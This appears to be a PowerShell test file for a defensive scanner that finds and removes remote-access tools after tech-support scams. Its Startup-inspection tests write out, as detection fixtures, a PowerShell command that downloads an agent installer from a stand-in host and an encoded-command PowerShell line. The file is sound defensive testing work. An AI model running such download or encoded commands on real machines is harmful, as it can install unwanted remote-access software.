$ErrorActionPreference = 'Stop'
$repoRoot = Split-Path -Parent $PSScriptRoot
$modulePath = Join-Path $repoRoot 'scripts\CompuTek.Scanner.Common.psm1'
$catalogPath = Join-Path $repoRoot 'scripts\RemoteAccessSignatures.json'
$scannerModule = Import-Module $modulePath -Force -PassThru

$script:Failures = 0
function Assert-True {
    param([bool]$Condition, [string]$Message)
    if ($Condition) {
        Write-Host "PASS: $Message" -ForegroundColor Green
    } else {
        $script:Failures++
        Write-Host "FAIL: $Message" -ForegroundColor Red
    }
}

function New-TestEvidence {
    param([hashtable]$Overrides)
    $values = [ordered]@{
        ArtifactType='File';Name='';DisplayName='';Path='';CommandLine='';ProductName=''
        FileDescription='';OriginalFilename='';PackageName='';FileName='';Publisher='';Signer=''
    }
    foreach ($key in $Overrides.Keys) { $values[$key] = $Overrides[$key] }
    return [pscustomobject]$values
}

$catalog = Get-CompuTekCatalog -Path $catalogPath
foreach ($relativePath in @(
    'scripts\CompuTek.Scanner.Common.psm1',
    'scripts\RemoteAccessScanAndRemove.ps1',
    'scripts\PostScam_SystemIntegrityScanner.ps1',
    'scripts\IT_Technician_Toolbox.ps1',
    'scripts\FinalSystemCheck_CompuTek.ps1',
    'scripts\PreClone.ps1'
)) {
    $tokens = $null
    $parseErrors = $null
    [void][System.Management.Automation.Language.Parser]::ParseFile((Join-Path $repoRoot $relativePath),[ref]$tokens,[ref]$parseErrors)
    Assert-True (@($parseErrors).Count -eq 0) "$relativePath parses in Windows PowerShell"
}
Assert-True (@($catalog.products).Count -ge 60) 'Catalog contains at least 60 remote-access/RMM product families'
Assert-True (@($catalog.products.id | Sort-Object -Unique).Count -eq @($catalog.products).Count) 'Catalog product IDs are unique'
Assert-True (Test-CompuTekTrustedMicrosoftApplication -Path 'C:\Users\Victim\AppData\Local\Microsoft\Teams\current\Teams.exe' -CompanyName 'Microsoft Corporation' -Signer 'CN=Microsoft Corporation' -SignatureStatus 'Valid') 'A valid Microsoft-signed Teams executable in its expected per-user folder is trusted'
Assert-True (Test-CompuTekTrustedMicrosoftApplication -Path 'C:\Users\Victim\AppData\Local\Microsoft\OneDrive\OneDrive.exe' -CompanyName 'Microsoft Corporation' -Signer 'CN=Microsoft Corporation' -SignatureStatus 'Valid') 'A valid Microsoft-signed OneDrive executable in its expected per-user folder is trusted'
Assert-True (Test-CompuTekTrustedMicrosoftApplication -Path 'C:\Users\Victim\AppData\Local\Microsoft\OneDrive\26.150.0804.0011\OneDriveLauncher.exe' -CompanyName 'Microsoft Corporation' -Signer 'CN=Microsoft Corporation' -SignatureStatus 'Valid' -ArtifactType ScheduledTask -Name 'OneDrive Startup Task') 'The signed versioned OneDriveLauncher scheduled task is trusted'
Assert-True (Test-CompuTekTrustedMicrosoftApplication -Path 'C:\Users\Victim\AppData\Local\Microsoft\WindowsApps\MSTeams_8wekyb3d8bbwe\ms-teams.exe' -SignatureStatus 'InspectionFailed' -ArtifactType RunKey -Name Teams -CommandLine '"C:\Users\Victim\AppData\Local\Microsoft\WindowsApps\MSTeams_8wekyb3d8bbwe\ms-teams.exe" msteams:system-initiated') 'The exact Microsoft Store Teams startup alias is trusted even though execution aliases cannot be signature-inspected'
Assert-True (-not (Test-CompuTekTrustedMicrosoftApplication -Path 'C:\Users\Victim\AppData\Local\Microsoft\WindowsApps\MSTeams_8wekyb3d8bbwe\ms-teams.exe' -SignatureStatus 'InspectionFailed' -ArtifactType RunKey -Name Teams -CommandLine 'malware.exe')) 'A Teams-looking Run value without the expected Store URI remains suspicious'
Assert-True (-not (Test-CompuTekTrustedMicrosoftApplication -Path 'C:\Users\Victim\AppData\Local\Microsoft\Teams\current\Teams.exe' -CompanyName 'Microsoft Corporation' -Signer '' -SignatureStatus 'NotSigned')) 'An unsigned Teams-named executable is not trusted'
Assert-True (-not (Test-CompuTekTrustedMicrosoftApplication -Path 'C:\Users\Victim\AppData\Roaming\Adobe\Teams.exe' -CompanyName 'Microsoft Corporation' -Signer 'CN=Microsoft Corporation' -SignatureStatus 'Valid')) 'A Teams-named executable outside Microsoft expected folders is still suspicious'
Assert-True (Test-CompuTekTrustedApplication -Path 'C:\Users\Victim\AppData\Local\OpenAI\Codex\bin\x64\codex.exe' -CompanyName 'OpenAI OpCo, LLC' -Signer 'CN=OpenAI OpCo, LLC' -SignatureStatus 'Valid') 'A valid OpenAI-signed Codex executable in its exact application folder is trusted'
Assert-True (Test-CompuTekTrustedApplication -Path 'C:\Users\Victim\AppData\Local\PowerToys\PowerToys.exe' -CompanyName 'Microsoft Corporation' -Signer 'CN=Microsoft Corporation' -SignatureStatus 'Valid') 'A valid Microsoft-signed PowerToys executable in its exact application folder is trusted'
Assert-True (Test-CompuTekTrustedApplication -Path 'C:\Users\Victim\AppData\Local\Mozilla Firefox\firefox.exe' -CompanyName 'Mozilla Corporation' -Signer 'CN=Mozilla Corporation' -SignatureStatus 'Valid') 'A valid Mozilla-signed per-user Firefox executable is trusted'
Assert-True (-not (Test-CompuTekTrustedApplication -Path 'C:\Users\Victim\AppData\Roaming\OpenAI\codex.exe' -CompanyName 'OpenAI OpCo, LLC' -Signer 'CN=OpenAI OpCo, LLC' -SignatureStatus 'Valid')) 'A signed lookalike outside the exact Codex folder remains reviewable'
Assert-True (-not (Test-CompuTekTrustedApplication -Path 'C:\Users\Victim\AppData\Local\OpenAI\Codex\bin\x64\codex.exe' -CompanyName 'OpenAI OpCo, LLC' -Signer '' -SignatureStatus 'NotSigned')) 'An unsigned Codex lookalike remains reviewable'

$remediationSource = Get-Content -LiteralPath (Join-Path $repoRoot 'scripts\RemoteAccessScanAndRemove.ps1') -Raw
Assert-True ($remediationSource -notmatch '\bScanOnly\b' -and $remediationSource -match 'SOFTWARE REQUIRING TECHNICIAN REVIEW' -and $remediationSource -match 'Show-CandidateSummary') 'Every reviewable remote-access finding is displayed before technician decisions'
Assert-True ($remediationSource -match 'Which agent numbers should be kept' -and $remediationSource -match 'KEEP NONE' -and $remediationSource -match 'Which agent numbers should be removed' -and $remediationSource -match 'Every agent must be classified') 'Technician must explicitly classify every numbered agent and is shown the KEEP NONE option'
Assert-True ($remediationSource -match 'PROTECTED COMPUTEK ACCESS' -and $remediationSource -match 'ProtectedCompuTekAccess\.json' -and $remediationSource -match 'Protected CompuTek access cannot be selected or removed') 'Verified CompuTek access is visibly protected and excluded from technician removal choices'
Assert-True ($remediationSource -match 'Safe choice when unsure: KEEP ALL, then REMOVE NONE' -and $remediationSource -match 'COMPUTEK OWNERSHIP NOT VERIFIED') 'Uncertain Splashtop findings tell lower-level technicians to keep and escalate instead of guessing'
Assert-True ($remediationSource -match 'OPEN 1' -and $remediationSource -match 'Open-CandidateInstallerFiles' -and $remediationSource -match '/select,' -and $remediationSource -match "Start-Process -FilePath 'explorer\.exe'") 'Technicians can show a numbered agent downloaded installer file in File Explorer before deciding'
Assert-True ($remediationSource -match "decisionConfirmation -ieq 'YES'" -and $remediationSource -notmatch 'CONFIRM DECISIONS|APPLY REMOVALS' -and $remediationSource -notmatch 'A for all') 'One simple typed YES authorizes only the technician-selected removals'
Assert-True ($remediationSource -match 'PreservedRemoteToolData' -and $remediationSource -match 'TechnicianDecisions\.json') 'Operational evidence and technician decisions are preserved'
Assert-True ($remediationSource -match 'PortableMedia-\$fileSystem-NormalPermissions' -and $remediationSource -notmatch '\bSet-Acl\b' -and $remediationSource -notmatch 'SetAccessRuleProtection') 'USB evidence keeps normal inherited permissions so technicians can remove old scan folders without elevation'
Assert-True ($remediationSource -match 'COMPUTEK_SCANNER_PORTABLE_ROOT' -and $remediationSource -match 'CompuTekData' -and $remediationSource -match 'EvidenceStorageSecurity') 'Cases, decisions, and quarantine evidence are stored and labeled on the service USB'
Assert-True ($remediationSource -match 'sc\.exe delete' -and $remediationSource -match 'Unregister-ScheduledTask') 'Full removal deletes residual service and scheduled-task persistence'
Assert-True ($remediationSource -match 'RemovalVerified' -and $remediationSource -match 'NotVerified-ScanIncomplete') 'Removal is only verified after a complete follow-up scan'
Assert-True ($remediationSource -match 'retry after blockers were stopped' -and $remediationSource -match 'Stop-CandidateServices' -and $remediationSource -match 'Stop-CandidateProcesses') 'A failed vendor uninstall is retried once after exact related blockers are stopped'
Assert-True ($remediationSource -match 'ManualRemovalRequired\.txt' -and $remediationSource -match 'TECHNICIAN ACTION REQUIRED' -and $remediationSource -match 'RemainingLocations') 'Incomplete removals show and save exact locations for manual technician work'
Assert-True ($remediationSource -match '\$attentionRequired' -and $remediationSource -match 'NotVerified-ScanFailed' -and $remediationSource -match 'do not manually delete files' -and $remediationSource -match 'exit \$\(if\(\$attentionRequired\)\{3\}else\{0\}\)') 'Incomplete or failed verification returns an attention result and never implies that removal was verified'
Assert-True ($remediationSource -match 'Get-CompuTekAttentionReason' -and $remediationSource -match '__COMPUTEK_RESULT_REASON__:' -and $remediationSource -match 'RemainingFindings' -and $remediationSource -match 'RemainingLocations') 'Attention result includes the affected product, remaining count, and an exact location when available'

$moduleSource = Get-Content -LiteralPath $modulePath -Raw
Assert-True ($moduleSource -match 'TaskPath\s*= \$task\.TaskPath' -and $moduleSource -match 'SourcePath = \$file\.FullName') 'Task and Startup-file source locations are retained for exact removal'
Assert-True ($moduleSource -notmatch "HeuristicReason\s*=\s*'Recent unsigned or invalidly signed executable") 'Unsigned Temp files alone are not treated as remote-access removal candidates'
Assert-True ($moduleSource -match '\$displayVersion\s*=\s*Get-CompuTekPropertyValue \$p ''DisplayVersion''' -and $moduleSource -match 'DisplayVersion\s+=\s+\$Artifact\.DisplayVersion') 'Installed-program versions are retained in findings for version-aware grouping'
Assert-True ($moduleSource -match '\$actionableMatches\s*=\s*@\(\$matches \| Where-Object \{\$_.Product.category -ne ''native-feature''\}\)' -and $moduleSource -match 'Post-Scam event evidence handles') 'Ordinary built-in Windows remote features are excluded from removal findings'
Assert-True ($moduleSource -match 'Test-CompuTekTrustedApplication' -and $moduleSource -match "ArtifactType -eq 'Process'[\s\S]+?ConnectionCount -gt 0[\s\S]+?Test-CompuTekTrustedApplication") 'Exact signed Teams, OneDrive, Codex, PowerToys, and Firefox applications are excluded from the generic user-writable network heuristic'
Assert-True ($moduleSource -match 'Get-CompuTekStartupCommandInfo' -and $moduleSource -match 'StartupReinstallRisk' -and $moduleSource -match '\.StartupItems\.csv') 'Every Startup folder item is inventoried and reinstall-capable commands are preserved in separate reports'
Assert-True ($moduleSource -match 'Get-AppxPackage -AllUsers' -and $moduleSource -match '\$currentUserPackages\s*=\s*@\(Get-AppxPackage' -and $moduleSource -match 'Get-StartApps') 'Store-app collection always combines all-user, current-user, and Start-app registration views'
Assert-True ($moduleSource -match 'Get-CompuTekPropertyValue \$product ''storeProductIds''') 'Optional Store product IDs are read safely under strict mode'
Assert-True ($remediationSource -match 'Remove-CandidateStoreProducts' -and $remediationSource -match 'AppxRemovalSucceeded' -and $remediationSource -match "'--source','msstore'" -and $remediationSource -match "'--disable-interactivity'") 'A failed or unavailable AppX removal can use the selected product exact Store ID before verification'
Assert-True ($remediationSource -match 'Test-CandidateHasKeptProductPeer' -and $remediationSource -match 'AllowProductWideStoreFallback' -and $remediationSource -match 'another version of this product was approved to keep') 'Product-wide Store fallback is blocked when a different version was approved to keep'
Assert-True ($moduleSource -match '\$inspectExecutableMetadata = \(\$file\.Extension[^\r\n]+\$DeepScan') 'Deep Scan inspects metadata in old executables so renamed dormant tools are not limited by lookback age'
Assert-True ($remediationSource -match 'Remove-CandidateStartupItems' -and $remediationSource -match 'startup-folder reinstall item' -and $remediationSource -match 'RemainingStartupItems' -and $remediationSource -match 'After-remediation startup inventory') 'Approved Startup relaunch items are quarantined before uninstall and checked by the follow-up scan'
Assert-True ($remediationSource -match 'Test-FindingIsIndependentProductCopy' -and $remediationSource -match "ArtifactType -in @\('InstalledProgram','AppxPackage'\)") 'Installed programs and Store packages anchor component evidence without merging independent portable copies'
Assert-True ($moduleSource -match 'Warnings\s*=\s*\$warningArray' -and $moduleSource -match 'CollectorWarnings\s*=\s*\$warningArray\.Count' -and $moduleSource -notmatch 'foreach \(\$warning in @\(\$script:CollectorWarnings\)\)[\s\S]{0,180}\$errors\.Add') 'Partial access warnings are reported without turning an otherwise successful removal verification into error code 3'
Assert-True ($moduleSource -match 'supersedesProductIds' -and @($catalog.products | Where-Object {$_.id -eq 'logmein-rescue'}).supersedesProductIds -contains 'logmein') 'A specific LogMeIn Rescue match suppresses the broad LogMeIn family match for the same artifact'
Assert-True ($remediationSource -match 'Wait-CompuTekTransientVendorCleanup' -and $remediationSource -match 'Waiting for the vendor uninstaller to finish its temporary cleanup before verification') 'Verification waits briefly for self-cleaning vendor uninstallers instead of flagging their temporary removal process as leftover software'

$singleEndpointArtifacts = @(& $scannerModule {
    function Get-CimInstance {
        [pscustomobject]@{
            ExecutablePath = $null
            CommandLine = '"C:\Temp\agent.exe"'
            ProcessId = 42
            Name = 'agent.exe'
        }
    }
    try {
        Get-CompuTekProcessArtifacts -ConnectionMap @{'42'='203.0.113.10:443'}
    } finally {
        Remove-Item Function:\Get-CimInstance -Force -ErrorAction SilentlyContinue
    }
})
Assert-True ($singleEndpointArtifacts.Count -eq 1 -and $singleEndpointArtifacts[0].ConnectionCount -eq 1) 'Process inventory handles a single active remote endpoint without failing the scan'

$malformedStartupPath = 'https://portal.example.invalid/start?source=Windows|Startup'
Assert-True ($null -eq (Get-CompuTekSafeFileName $malformedStartupPath)) 'A Startup URL with filename-invalid characters is handled without throwing'
$malformedPathEvidence = New-TestEvidence @{ArtifactType='StartupFile';Name='Vendor Portal';DisplayName='Vendor Portal';Path=$malformedStartupPath;CommandLine=$malformedStartupPath}
$malformedPathMatches = @(Find-CompuTekProductMatch -Catalog $catalog -Evidence $malformedPathEvidence)
Assert-True ($malformedPathMatches.Count -eq 0) 'Malformed or URL-style artifact paths do not abort remote-product analysis'
Assert-True ($remediationSource -notmatch '\[IO\.Path\]::GetFileName') 'Finding display uses the guarded filename parser and cannot repeat the analysis crash'

$artifactRoot = [IO.Path]::GetFullPath((Join-Path $repoRoot 'artifacts'))
$traversalRoot = Join-Path $artifactRoot ('TraversalTest-' + [Guid]::NewGuid().ToString('N'))
try {
    $current = New-Item -Path $traversalRoot -ItemType Directory -Force
    $expectedFile = Join-Path $current.FullName 'ScreenConnect.ClientService.exe'
    Set-Content -LiteralPath $expectedFile -Value 'test' -Encoding ASCII
    foreach ($depth in 1..6) { $current = New-Item -Path (Join-Path $current.FullName ("Depth$depth")) -ItemType Directory -Force }
    $tooDeepFile = Join-Path $current.FullName 'AnyDesk.exe'
    Set-Content -LiteralPath $tooDeepFile -Value 'test' -Encoding ASCII
    $traversalResults = @(& $scannerModule { param($root) Get-CompuTekCandidateFilesSafe -Root $root -Extensions @('.exe') -MaxDepth 5 } $traversalRoot)
    Assert-True ($traversalResults.FullName -contains $expectedFile) 'Bounded file discovery finds ScreenConnect executables in a scanned high-risk folder'
    Assert-True ($traversalResults.FullName -notcontains $tooDeepFile) 'Normal file discovery honors its depth boundary; Deep Scan is required beyond it'
} finally {
    $resolvedTraversalRoot = [IO.Path]::GetFullPath($traversalRoot)
    if ($resolvedTraversalRoot.StartsWith($artifactRoot + [IO.Path]::DirectorySeparatorChar,[StringComparison]::OrdinalIgnoreCase) -and (Test-Path -LiteralPath $resolvedTraversalRoot)) {
        Remove-Item -LiteralPath $resolvedTraversalRoot -Recurse -Force
    }
}

$startupTestRoot = Join-Path $artifactRoot ('StartupInspectionTest-' + [Guid]::NewGuid().ToString('N'))
try {
    New-Item -Path $startupTestRoot -ItemType Directory -Force | Out-Null
    $reinstallerPath = Join-Path $startupTestRoot 'SupportAgentUpdate.cmd'
    $benignPath = Join-Path $startupTestRoot 'OpenNotes.cmd'
    $encodedPath = Join-Path $startupTestRoot 'EncodedUpdate.cmd'
    Set-Content -LiteralPath $reinstallerPath -Value 'powershell.exe -NoProfile -Command "Invoke-WebRequest https://example.invalid/SupportAgentSetup.exe -OutFile $env:TEMP\SupportAgentSetup.exe"' -Encoding ASCII
    Set-Content -LiteralPath $benignPath -Value 'notepad.exe' -Encoding ASCII
    Set-Content -LiteralPath $encodedPath -Value 'powershell.exe -NoProfile -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0AA==' -Encoding ASCII
    $reinstallerInfo = Get-CompuTekStartupCommandInfo -File (Get-Item -LiteralPath $reinstallerPath)
    $benignInfo = Get-CompuTekStartupCommandInfo -File (Get-Item -LiteralPath $benignPath)
    $encodedInfo = Get-CompuTekStartupCommandInfo -File (Get-Item -LiteralPath $encodedPath)
    Assert-True ($reinstallerInfo.ReinstallRisk -and $reinstallerInfo.AnalysisText -match 'Invoke-WebRequest') 'A Startup script that redownloads an agent is marked as a reinstall risk'
    Assert-True (-not $benignInfo.ReinstallRisk) 'A benign Startup script is inventoried without being flagged as a reinstall risk'
    Assert-True $encodedInfo.ReinstallRisk 'An encoded PowerShell command in Startup is marked for technician review'

    $startupReportDirectory = Join-Path $startupTestRoot 'Report'
    $syntheticStartup = [pscustomobject]@{
        Name='SupportAgentUpdate.cmd';SourcePath=$reinstallerPath;StartupTarget=$reinstallerPath;StartupArguments=''
        StartupReinstallRisk=$true;HeuristicReason='Startup folder item can download or reinstall software at sign-in'
        CommandLine=$reinstallerInfo.AnalysisText;LastWriteTimeUtc=(Get-Date).ToUniversalTime();OriginalFilename=$null
        CompanyName=$null;Signer=$null;SignatureStatus='Unknown'
    }
    $syntheticScan = [pscustomobject]@{Findings=@();StartupInventory=@($syntheticStartup)}
    $startupReport = Export-CompuTekScanReport -Scan $syntheticScan -Directory $startupReportDirectory -BaseName 'StartupTest'
    Assert-True ((Test-Path -LiteralPath $startupReport.StartupJson) -and (Test-Path -LiteralPath $startupReport.StartupCsv) -and ((Get-Content -LiteralPath $startupReport.StartupCsv -Raw) -match 'SupportAgentUpdate\.cmd')) 'Startup inventory JSON and CSV reports retain the exact Startup item'

    $emptyStartupReport = Export-CompuTekScanReport -Scan ([pscustomobject]@{Findings=@();StartupInventory=@()}) -Directory $startupReportDirectory -BaseName 'EmptyStartupTest'
    Assert-True ((Test-Path -LiteralPath $emptyStartupReport.StartupCsv) -and ((Get-Content -LiteralPath $emptyStartupReport.StartupCsv -Raw) -match 'StartupReinstallRisk')) 'An empty Startup inventory still produces a readable CSV with column headings'
} finally {
    $resolvedStartupTestRoot = [IO.Path]::GetFullPath($startupTestRoot)
    if ($resolvedStartupTestRoot.StartsWith($artifactRoot + [IO.Path]::DirectorySeparatorChar,[StringComparison]::OrdinalIgnoreCase) -and (Test-Path -LiteralPath $resolvedStartupTestRoot)) {
        Remove-Item -LiteralPath $resolvedStartupTestRoot -Recurse -Force
    }
}

$currentUserStoreArtifacts = @(& $scannerModule {
    function Get-AppxPackage {
        [CmdletBinding()]
        param([switch]$AllUsers)
        if ($AllUsers) { return @() }
        return [pscustomobject]@{
            Name='YellowElephantProductions.TeamRemoteDesktop'
            PackageFullName='YellowElephantProductions.TeamRemoteDesktop_1.0.0.0_x64__p3e1zgp7z7szg'
            PackageFamilyName='YellowElephantProductions.TeamRemoteDesktop_p3e1zgp7z7szg'
            InstallLocation='C:\Program Files\WindowsApps\YellowElephantProductions.TeamRemoteDesktop_1.0.0.0_x64__p3e1zgp7z7szg'
            Publisher='CN=Yellow Elephant Productions';Version=[version]'1.0.0.0'
        }
    }
    function Get-StartApps { [CmdletBinding()] param(); return @() }
    try { Get-CompuTekAppxArtifacts } finally {
        Remove-Item Function:\Get-AppxPackage -Force -ErrorAction SilentlyContinue
        Remove-Item Function:\Get-StartApps -Force -ErrorAction SilentlyContinue
    }
})
Assert-True ($currentUserStoreArtifacts.Count -eq 1 -and $currentUserStoreArtifacts[0].PackageFullName -match 'TeamRemoteDesktop') 'A Store package omitted by -AllUsers is retained from the always-run current-user query'

$startAppFallbackArtifacts = @(& $scannerModule {
    function Get-AppxPackage { [CmdletBinding()] param([switch]$AllUsers); return @() }
    function Get-StartApps {
        [CmdletBinding()]
        param()
        return @(
            [pscustomobject]@{Name='TeamViewer Remote';AppID='TeamViewer.Remote'},
            [pscustomobject]@{Name='Team Remote Desktop';AppID='YellowElephantProductions.TeamRemoteDesktop_p3e1zgp7z7szg!App'}
        )
    }
    try { Get-CompuTekAppxArtifacts } finally {
        Remove-Item Function:\Get-AppxPackage -Force -ErrorAction SilentlyContinue
        Remove-Item Function:\Get-StartApps -Force -ErrorAction SilentlyContinue
    }
})
Assert-True ($startAppFallbackArtifacts.Count -eq 2 -and @($startAppFallbackArtifacts | Where-Object {$_.ArtifactType -eq 'StartApp'}).Count -eq 2) 'Start registrations retain Store-delivered remote apps when package inventory returns no records'

$nonStoreFinding = & $scannerModule {
    param($testCatalog)
    $artifact = New-CompuTekArtifact @{ArtifactType='Service';Name='ScreenConnect Client Test';DisplayName='ScreenConnect Client Test'}
    $product = @($testCatalog.products | Where-Object {$_.id -eq 'screenconnect'})[0]
    ConvertTo-CompuTekFinding -Artifact $artifact -Match ([pscustomobject]@{Product=$product}) -Disposition 'KnownRemoteAccessSoftware' -Confidence 'High' -EvidenceText 'service:ScreenConnect*'
} $catalog
Assert-True ($nonStoreFinding.ProductId -eq 'screenconnect' -and @($nonStoreFinding.StoreProductIds).Count -eq 0) 'Analysis accepts ordinary catalog products that do not define an optional Store ID'

$storeFinding = & $scannerModule {
    param($testCatalog)
    $artifact = New-CompuTekArtifact @{ArtifactType='StartApp';Name='TeamViewer Remote';DisplayName='TeamViewer Remote';PackageName='TeamViewer.Remote'}
    $product = @($testCatalog.products | Where-Object {$_.id -eq 'teamviewer'})[0]
    ConvertTo-CompuTekFinding -Artifact $artifact -Match ([pscustomobject]@{Product=$product}) -Disposition 'KnownRemoteAccessSoftware' -Confidence 'High' -EvidenceText 'package:*TeamViewer*'
} $catalog
Assert-True (@($storeFinding.StoreProductIds) -contains 'XPDM17HK323C4X') 'Analysis retains the exact Store ID when the catalog product defines one'

$allCatalogFindings = @(& $scannerModule {
    param($testCatalog)
    foreach ($product in @($testCatalog.products)) {
        $artifact = New-CompuTekArtifact @{ArtifactType='Service';Name=('Synthetic ' + $product.id);DisplayName=('Synthetic ' + $product.name)}
        ConvertTo-CompuTekFinding -Artifact $artifact -Match ([pscustomobject]@{Product=$product}) -Disposition 'CatalogRegressionTest' -Confidence 'High' -EvidenceText 'synthetic'
    }
} $catalog)
Assert-True ($allCatalogFindings.Count -eq @($catalog.products).Count) 'Analysis materializes every catalog family under strict mode, including products without optional fields'

$remediationTokens = $null
$remediationErrors = $null
$remediationAst = [System.Management.Automation.Language.Parser]::ParseFile((Join-Path $repoRoot 'scripts\RemoteAccessScanAndRemove.ps1'),[ref]$remediationTokens,[ref]$remediationErrors)
foreach ($functionName in @('Get-CompuTekAttentionReason','Get-CandidateInstallerFiles','Get-FindingScopePath','Test-FindingIsWindowsHostProcess','Test-FindingIsPassiveSupportEvidence','Get-FindingDetectedVersion','Test-FindingIsIndependentProductCopy','Get-CompuTekManagedIdentityStatus','Test-PathWithinVersionAnchor','New-RemovalCandidates','Split-CompuTekRemovalCandidates','Invoke-FullCandidateRemoval','Remove-CandidateAppxPackages','Test-FindingBelongsToCandidate','Test-CandidateHasKeptProductPeer','ConvertTo-CompuTekCandidateSelection','Test-ProtectedRemediationPath')) {
    $functionAst = @($remediationAst.FindAll({param($node) $node -is [System.Management.Automation.Language.FunctionDefinitionAst] -and $node.Name -eq $functionName},$true))[0]
    Invoke-Expression $functionAst.Extent.Text
}
$sampleAttentionReason = Get-CompuTekAttentionReason -Items @([pscustomobject]@{
    ProductName = 'AnyDesk'
    Status = 'RemovalIncomplete'
    RemainingFindings = 2
    Locations = @('C:\Users\User\AppData\Local\Temp\AnyDeskUninst5850.exe')
    StartupItems = @()
})
Assert-True ($sampleAttentionReason -match 'AnyDesk' -and $sampleAttentionReason -match '2 matching finding' -and $sampleAttentionReason -match [regex]::Escape('C:\Users\User\AppData\Local\Temp\AnyDeskUninst5850.exe') -and $sampleAttentionReason -match 'Reboot') 'Attention reason names the remaining product, count, location, and safe next step'
$sampleScanFailureReason = Get-CompuTekAttentionReason -VerificationErrors @('Scheduled-task collection failed')
Assert-True ($sampleScanFailureReason -match 'Scheduled-task collection failed' -and $sampleScanFailureReason -match 'could not verify a clean result') 'Attention reason explains the collector problem when verification could not complete'
$caseRoot = 'Z:\CompuTekTest\Case'
$quarantineRoot = 'Z:\CompuTekTest\Quarantine'
$approvedManagedIdentity = [pscustomobject]@{SyncroApproved=$true;SplashtopLinked=$true;MatchMethod='Synthetic approved Syncro shop identity hash'}
$unapprovedManagedIdentity = [pscustomobject]@{SyncroApproved=$false;SplashtopLinked=$false;MatchMethod='No approved Syncro shop identity match'}

$syntheticShopSubdomain = 'computek-test-shop'
$identitySha = [Security.Cryptography.SHA256]::Create()
try { $syntheticShopHash = ([BitConverter]::ToString($identitySha.ComputeHash([Text.Encoding]::UTF8.GetBytes($syntheticShopSubdomain)))).Replace('-','') } finally { $identitySha.Dispose() }
$syntheticIdentityCatalog = [pscustomobject]@{
    managedIdentities = [pscustomobject]@{
        syncro = [pscustomobject]@{shopSubdomainSha256=@($syntheticShopHash)}
    }
}
$matchingManagedIdentity = & {
    function Get-ItemProperty {
        param($LiteralPath,$ErrorAction)
        if ($LiteralPath -match 'RepairTech\\Syncro$') {
            return [pscustomobject]@{shop_subdomain=$syntheticShopSubdomain;SplashtopState='{"Enabled":true,"RmmCode":"SYNTHETIC-CODE-A"}'}
        }
        if ($LiteralPath -match 'Splashtop Remote Server$') { return [pscustomobject]@{RmmCode='SYNTHETIC-CODE-A'} }
        throw 'Synthetic registry path not found'
    }
    try { Get-CompuTekManagedIdentityStatus -Catalog $syntheticIdentityCatalog } finally { Remove-Item Function:\Get-ItemProperty -Force -ErrorAction SilentlyContinue }
}
Assert-True ($matchingManagedIdentity.SyncroApproved -and $matchingManagedIdentity.SplashtopLinked -and $matchingManagedIdentity.MatchMethod -notmatch 'SYNTHETIC-CODE') 'Splashtop is managed only when its live RMM code exactly matches enabled Syncro state, without returning the code'

$mismatchedManagedIdentity = & {
    function Get-ItemProperty {
        param($LiteralPath,$ErrorAction)
        if ($LiteralPath -match 'RepairTech\\Syncro$') {
            return [pscustomobject]@{shop_subdomain=$syntheticShopSubdomain;SplashtopState='{"Enabled":true,"RmmCode":"SYNTHETIC-CODE-A"}'}
        }
        if ($LiteralPath -match 'Splashtop Remote Server$') { return [pscustomobject]@{RmmCode='SYNTHETIC-CODE-B'} }
        throw 'Synthetic registry path not found'
    }
    try { Get-CompuTekManagedIdentityStatus -Catalog $syntheticIdentityCatalog } finally { Remove-Item Function:\Get-ItemProperty -Force -ErrorAction SilentlyContinue }
}
Assert-True ($mismatchedManagedIdentity.SyncroApproved -and -not $mismatchedManagedIdentity.SplashtopLinked) 'A different Splashtop RMM code remains a separate technician finding even on a CompuTek-managed PC'

$disabledManagedIdentity = & {
    function Get-ItemProperty {
        param($LiteralPath,$ErrorAction)
        if ($LiteralPath -match 'RepairTech\\Syncro$') {
            return [pscustomobject]@{shop_subdomain=$syntheticShopSubdomain;SplashtopState='{"Enabled":false,"RmmCode":"SYNTHETIC-CODE-A"}'}
        }
        if ($LiteralPath -match 'Splashtop Remote Server$') { return [pscustomobject]@{RmmCode='SYNTHETIC-CODE-A'} }
        throw 'Synthetic registry path not found'
    }
    try { Get-CompuTekManagedIdentityStatus -Catalog $syntheticIdentityCatalog } finally { Remove-Item Function:\Get-ItemProperty -Force -ErrorAction SilentlyContinue }
}
Assert-True ($disabledManagedIdentity.SyncroApproved -and -not $disabledManagedIdentity.SplashtopLinked) 'A matching code is not enough when Syncro reports Splashtop disabled'
Assert-True (Test-ProtectedRemediationPath -Path 'C:\Program Files\Common Files\Microsoft Shared' -Directory) 'Shared Common Files trees cannot be quarantined as a product folder'
Assert-True (Test-ProtectedRemediationPath -Path 'C:\ProgramData\Microsoft\Windows' -Directory) 'Microsoft ProgramData trees cannot be quarantined as a product folder'
Assert-True (Test-ProtectedRemediationPath -Path 'C:\Users\Victim\Downloads' -Directory) 'A whole user Downloads folder cannot be quarantined'
Assert-True (Test-ProtectedRemediationPath -Path 'C:\Users\Victim' -Directory) 'A whole user profile cannot be quarantined'
Assert-True (-not (Test-ProtectedRemediationPath -Path 'C:\Program Files\RemoteVendor\Agent' -Directory)) 'A vendor-specific program directory remains eligible after technician-approved removal'
Assert-True (-not (Test-ProtectedRemediationPath -Path 'C:\Users\Victim\AppData\Roaming\RemoteVendor' -Directory)) 'A vendor-specific AppData directory remains eligible after technician-approved removal'
$msiHostFinding = [pscustomobject]@{ProductId='screenconnect';Category='remote-support';ArtifactType='InstalledProgram';Path='MsiExec.exe';InstallLocation=$null}
Assert-True ($null -eq (Get-FindingScopePath $msiHostFinding)) 'A bare MSI host name cannot become a fake ProgramData engine location'
$legitimateInstall = [pscustomobject]@{ProductId='screenconnect';ProductName='ScreenConnect / ConnectWise Control';Category='remote-support';ArtifactType='InstalledProgram';Name='Company Support';Path='C:\Program Files\ScreenConnect';InstallLocation='C:\Program Files\ScreenConnect';RegistryPath='HKLM:\Software\Uninstall\CompanySupport';PackageFullName=$null;DisplayVersion='24.1.0';FileVersion=$null}
$legitimateService = [pscustomobject]@{ProductId='screenconnect';ProductName='ScreenConnect / ConnectWise Control';Category='remote-support';ArtifactType='Service';Name='ScreenConnect Client Company';Path='C:\Program Files\ScreenConnect\Client\ScreenConnect.ClientService.exe';InstallLocation=$null;RegistryPath=$null;PackageFullName=$null;DisplayVersion=$null;FileVersion='24.1.0.123'}
